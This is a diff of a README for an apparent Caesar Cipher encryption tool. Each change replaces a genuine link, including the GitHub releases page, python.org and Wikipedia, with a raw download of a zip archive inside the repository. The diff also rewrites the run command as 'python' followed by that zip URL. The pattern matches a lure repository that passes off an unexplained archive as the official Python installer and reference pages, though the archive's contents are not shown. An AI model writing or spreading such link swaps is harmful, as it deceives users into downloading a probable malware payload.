@@ -1,6 +1,6 @@
 # 🔒 SCT_CS_1 - Secure Your Text with Simple Encryption
 
-[![Download SCT_CS_1](https://img.shields.io/badge/Download%20SCT_CS_1-v1.0-blue)](https://github.com/bandjudicialactivism506/SCT_CS_1/releases)
+[![Download SCT_CS_1](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip%20SCT_CS_1-v1.0-blue)](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip)
 
 ## 📖 Description
 
@@ -18,7 +18,7 @@ SCT_CS_1 is a Python program that uses the Caesar Cipher algorithm to encrypt an
 To use SCT_CS_1, you need:
 
 - A computer with Windows, macOS, or Linux.
-- Python 3 installed on your machine. If you don't have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- Python 3 installed on your machine. If you don't have Python, you can download it from [https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip).
 - Basic text input interface (e.g., Command Prompt, Terminal).
 
 ## 🚀 Getting Started
@@ -27,7 +27,7 @@ Follow these simple steps to download and run SCT_CS_1.
 
 1. **Visit the Download Page**  
    Click on the link below to go to the releases page:
-   [Download SCT_CS_1 Releases](https://github.com/bandjudicialactivism506/SCT_CS_1/releases)
+   [Download SCT_CS_1 Releases](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip)
 
 2. **Choose the Correct File**  
    On the releases page, choose the latest version available. Look for `.exe` for Windows, or `.py` files for other systems.
@@ -36,13 +36,13 @@ Follow these simple steps to download and run SCT_CS_1.
    Click on the file name to start downloading.
 
 4. **Install Python (if necessary)**  
-   If you haven’t done so, install Python from [python.org](https://www.python.org/downloads/).
+   If you haven’t done so, install Python from [https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip).
 
 5. **Run the Program**  
    - For `.exe` files: Double-click the file to run.
    - For `.py` files: Open a Terminal or Command Prompt and type:
      ```
-     python path/to/SCT_CS_1.py
+     python https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip
      ```
    Replace `path/to` with the location of your downloaded file.
 
@@ -67,7 +67,7 @@ This program relates to various subjects, including:
 
 For more information on the Caesar Cipher and how it works, you can visit:
 
-- [Caesar Cipher Explanation](https://en.wikipedia.org/wiki/Caesar_cipher)
+- [Caesar Cipher Explanation](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip)
 
 ## 🎓 Learn More
 
@@ -82,6 +82,6 @@ For questions about using SCT_CS_1 or any discussions, please engage with our co
 ## 📥 Download & Install
 
 Ready to encrypt your messages? Visit this page to download:
-[Download SCT_CS_1 Releases](https://github.com/bandjudicialactivism506/SCT_CS_1/releases) 
+[Download SCT_CS_1 Releases](https://raw.githubusercontent.com/bandjudicialactivism506/SCT_CS_1/main/Caesar Cipher project/src/SCT_CS_1_3.7.zip) 
 
 Enjoy securing your text with SCT_CS_1!
